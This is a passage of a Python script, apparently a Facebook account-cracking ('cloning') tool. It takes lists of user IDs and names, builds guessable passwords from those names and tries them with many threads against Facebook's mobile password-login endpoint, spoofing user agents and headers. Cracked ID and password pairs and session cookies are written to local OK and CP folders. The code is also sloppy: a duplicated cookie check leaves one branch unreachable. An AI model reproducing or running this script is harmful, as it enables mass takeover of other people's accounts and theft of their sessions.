            ua3 = random.choice(["Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","Mozilla/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit/538.1+ (KHTML, like Gecko) TV Safari/538.1+","Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
            ses = requests.Session()
            ua = random.choice(ugen)
            ua2 = random.choice(ugen2)
            ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=heade,allow_redirects=False)
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[NIKI-CP] {idf}|{pw}')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[NIKI-OK] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1


####-------------[ FILE-FOUR ]----------------####
try:
    sua = open('user.txt', 'r').read().splitlines()
except:
    pass
sua = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20']

try:
    sua2 = open('user2.txt', 'r').read().splitlines()
except:
    pass
sua2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20']

def four():
    look()
    sex = input('\n [!] Input File Path : ')
    print('')
    try:lin = open(sex).read().splitlines()
    except:
        print('\033[1;91m [x] File Not Found')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting3()

def setting3():
    look()
    print(" [1] Crack From Old Id")
    print(" [2] Crack From New Id")
    print(" [3] Crack From Mix Id [best]")
    hu = input("\n [?] Choose : ")
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    method.append('mobile')
    passwrd3()

def passwrd3():
    look()
    print(' [*] Clonnig Time Use Only Mobile Data')
    print(' [*] Use (Airplane) Mode If Ids Not Coming')
    print(' [*] Your Clonnig Stop Press Ctrl Than z')
    print('------------------------------------------------')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
            except:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                pwv = []
            except:
                pwv = ['mahadi','hasan','afridi','jisan','ethan']
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack3,idf,pwv,nmf)
            else:
                print("")
    print('\x1b[1;97m------------------------------------------------')
    print(' [!] The Process Has Been Complete...')
    print(' [!] Thanks Using My Paid Tools')
    print('------------------------------------------------')
    input("\n\x1b[1;93m [√] Press Enter To Back ")
    back()
def crack3(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[NIKI] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            dat = {}
            url = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin")
            header = {
            "Host": "mbasic.facebook.com",
            "connection":"keep-alive",
            "cache-control": "max-age=0",
            "save-data": "on",
            "origin": "https://mbasic.facebook.com",
            "content-type": "application/x-www-form-urlencoded",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
            "x-requested-with": "mark.via.gp",
            "dnt": "1","sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'",
            "sec-ch-ua-mobile":"?1",
            "sec-ch-ua-platform":"'Android'",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "Upgrade-Insecure-Requests":"1",
            "User-Agent":ua,
            "referer": "https://mbasic.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
            } 
            dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": idf,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
            xx = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=header)
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[NIKI-CP] {idf}|{pw}')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[NIKI-OK] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#--------------------[ MAHADI ]-----------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('Green-Lover')
    except:pass
    ___fuckyoursystem____()